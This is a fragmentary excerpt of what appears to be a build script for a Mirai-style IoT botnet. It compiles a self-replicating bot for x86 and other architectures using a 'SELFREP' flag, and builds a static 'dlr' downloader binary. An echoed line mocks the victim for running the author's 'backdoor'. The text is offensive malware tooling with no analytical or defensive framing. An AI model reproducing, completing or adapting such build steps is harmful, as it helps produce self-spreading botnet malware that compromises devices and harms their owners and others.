...
echo ".. i586"
compile_bot x86 gang123isgodloluaintgettingthesebinslikedammwtfs.x86 "-static -DSELFREP"
echo "bin compiled"
echo "... mips"
...
###################################################################
echo "DELETING SYSTEM 32 THANK YOU FOR RUNNING MY BACKDOOR"
...
x86-gcc -Os -D BOT_ARCH=\"x86\" -D X32 -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.x86
